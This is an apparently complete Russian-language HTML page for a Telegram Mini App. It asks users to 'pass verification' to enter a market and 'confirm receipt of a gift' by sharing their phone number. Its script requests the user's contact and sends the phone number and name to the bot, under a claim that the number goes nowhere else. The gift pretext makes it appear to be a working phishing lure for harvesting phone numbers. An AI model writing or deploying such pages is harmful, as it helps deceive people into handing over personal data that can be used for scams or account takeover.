<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Верификация</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      background: #0f121a;
      color: #d1d5db;
      font-family: 'Inter', system-ui, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }

    .card {
      background: #161b22;
      border-radius: 16px;
      padding: 2.5rem 2rem;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
      border: 1px solid #2d3748;
      text-align: center;
    }

    .title {
      font-size: 1.6rem;
      font-weight: 600;
      margin-bottom: 1rem;
      color: #e2e8f0;
    }

    .subtitle {
      font-size: 1rem;
      line-height: 1.5;
      color: #94a3b8;
      margin-bottom: 2.5rem;
    }

    .btn {
      background: #2563eb;
      color: white;
      border: none;
      padding: 1rem 2.2rem;
      font-size: 1.05rem;
      font-weight: 500;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.25s ease;
      width: 100%;
      max-width: 260px;
      margin: 0 auto;
      display: block;
    }

    .btn:hover {
      background: #3b82f6;
      transform: translateY(-1px);
    }

    .info {
      margin-top: 1.8rem;
      font-size: 0.85rem;
      color: #64748b;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="title">Для входа в маркет</div>
    <div class="subtitle">пройдите верификацию</div>

    <button class="btn" id="grant">Поделиться номером</button>

    <div class="info">
      Это нужно для подтверждения получения подарка<br>
      Ваш номер виден только боту и не передаётся третьим лицам
    </div>
  </div>

  <script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    document.getElementById('grant').onclick = async () => {
      try {
        const contact = await tg.requestContact();
        tg.sendData(JSON.stringify({
          contact: {
            phone_number: contact.phone_number,
            first_name: contact.first_name,
            last_name: contact.last_name || ''
          }
        }));
        tg.close();
      } catch (e) {
        tg.sendData(JSON.stringify({ error: e.message || 'denied' }));
      }
    };
  </script>
</body>
</html>
